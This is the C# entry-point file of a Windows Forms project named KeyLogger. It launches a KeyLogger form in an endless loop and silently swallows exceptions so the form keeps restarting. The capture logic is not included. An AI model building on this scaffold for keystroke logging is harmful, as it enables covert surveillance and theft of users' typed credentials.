using System;
using System.Windows.Forms;

namespace KeyLogger
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            while (true)
            {
                try
                {
                    Application.Run(new KeyLogger());
                }
                catch
                { }
            }
        }
    }
}
